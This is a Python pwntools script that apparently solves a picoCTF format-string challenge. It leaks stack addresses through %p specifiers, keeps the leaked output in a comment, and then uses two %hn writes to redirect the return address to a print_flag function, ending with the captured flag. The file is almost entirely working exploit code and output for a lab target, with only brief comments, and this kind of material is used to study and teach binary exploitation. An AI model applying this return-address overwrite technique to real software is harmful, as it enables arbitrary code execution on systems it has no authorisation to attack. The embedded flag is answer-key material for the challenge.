from pwn import *

p = remote("shape-facility.picoctf.net", 60616)

print(p.recvuntil("Try Shouting: \n"))


def print_stack(p):
    stack_addr_22p = 0

    def resp2str(addresses):
        result = []
        for addr in addresses:
            addr_str = addr.decode()
            if addr_str == "(nil)":
                high, low = "00000000", "00000000"
            else:
                num = int(addr_str, 16)
                high = f"{(num >> 32) & 0xFFFFFFFF:08x}"
                low = f"{num & 0xFFFFFFFF:08x}"
            result.extend([low, high])
        return " ".join(result)

    for i in range(2, 40, 2):
        p.sendline(
            f"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@@@%{i}$p.%{i+1}$p@@@BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
        )
        resp = p.recvline()
        addresses = resp.split(b"@@@")[1].split(b".")
        print(f"%{i:2}$p:", resp2str(addresses))

        # notice that the [value of %20$p] is the [stack address of %22$p]
        if i == 20:
            stack_addr_22p = int(addresses[0].decode(), 16)

    return stack_addr_22p


stack_addr_22p = print_stack(p)
print(f"stack_addr_22p: {hex(stack_addr_22p)}")
"""
% 2$p: 00000000 00000000 00000000 00000000
% 4$p: 17c4230f 00005c20 00000000 00000000
% 6$p: 41414141 41414141 41414141 41414141
% 8$p: 41414141 41414141 41414141 41414141
%10$p: 41414141 40414141 31254040 2e702430
%12$p: 24333125 40404070 42424242 42424242
%14$p: 42424242 42424242 42424242 42424242
%16$p: 42424242 42424242 42424242 42424242
%18$p: 0000000a 00000000 cd8ccd00 674cd41f
%20$p: 9c3e5280 00007ffd(120cd413 00005c20)  <-- the value of %21$p is return address, ends with 0x413
%22$p: 9c3e5320 00007ffd 9ed701ca 00007dd0
%24$p: 9c3e52d0 00007ffd 9c3e53a8 00007ffd
%26$p: 120cc040 00000001 120cd401 00005c20
%28$p: 9c3e53a8 00007ffd 39525fe6 78889720
%30$p: 00000001 00000000 00000000 00000000
%32$p: 120cfd78 00005c20 9ef95000 00007dd0
%34$p: 3a325fe6 78889720 9c105fe6 7cd292f2
%36$p: 00000000 00007ffd 00000000 00000000
%38$p: 00000000 00000000 00000001 00000000
stack_addr_22p: 0x7ffd9c3e5280
"""

p.sendline(f"%21$p")
ret_addr_resp = p.recvline()
ret_addr = int(ret_addr_resp.split(b": ")[-1].strip(), 16)
print(f"ret_addr: {hex(ret_addr)}")

# notice that the [value of %20$p] is the [stack address of %22$p]
# set [value of address that %20$p points to] = [stack address of %21$p]
# which means set [value of %22$p] = [stack address of %21$p]
p.sendline(f"%{(stack_addr_22p & 0xFFFF) - 0x8}c%20$hn")
p.recvline()

# set [value of address that %22$p points to] = [address of print_flag]
# which means set [value of %21$p] = [address of print_flag]
p.sendline(f"%{(ret_addr & 0xFFFF) - 0x1413 + 0x1269}c%22$hn")
p.recvline()

p.sendline("exit")
print(p.recvall())

# picoctf{f1ckl3_f0rmat_f1asc0}
